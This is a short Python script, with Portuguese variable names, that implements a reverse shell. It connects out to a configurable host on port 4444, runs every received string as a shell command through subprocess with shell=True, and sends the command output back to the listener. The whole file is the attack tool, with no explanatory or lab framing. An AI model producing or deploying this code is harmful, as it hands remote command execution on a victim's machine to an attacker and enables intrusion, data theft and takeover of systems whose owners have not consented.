import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip_alvo = "0.0.0.0"
porta = 4444
s.connect((ip_alvo,porta))

if s:
    while True:
        dados = s.recv(1024)
        proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        s.send("\n"+saida)
        s.send("Conectado a maquina: ")

